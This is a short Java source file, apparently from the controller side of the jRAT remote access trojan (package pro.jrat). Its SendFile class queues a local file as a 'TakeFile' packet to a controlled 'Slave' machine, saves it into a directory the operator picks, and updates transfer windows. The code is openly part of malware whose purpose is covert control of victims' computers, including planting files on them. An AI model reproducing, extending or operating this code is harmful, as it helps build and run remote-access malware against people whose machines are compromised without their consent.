package pro.jrat;

import java.io.File;

import pro.jrat.packets.outgoing.Packet42TakeFile;
import pro.jrat.ui.frames.FrameFileTransfer;
import pro.jrat.ui.frames.FrameRemoteFiles;

public class SendFile {

	public static void sendFile(Slave slave, String file, String destdir) {
		sendFile(slave, new File(file), destdir);
	}

	public static void sendFile(final Slave slave, final File file, String destdir) {
		final FrameFileTransfer frame = FrameFileTransfer.instance;
		final FrameRemoteFiles frame2 = FrameRemoteFiles.instances.get(slave);

		if (frame2 != null) {
			frame2.start();
		}

		try {
			slave.addToSendQueue(new Packet42TakeFile(destdir, file.getName(), file));

			if (frame != null) {
				frame.done(file.getAbsolutePath(), file.length() + "");
			}
			if (frame2 != null) {
				frame2.done();
			}

		} catch (Exception ex) {
			ex.printStackTrace();
		}
	}

}
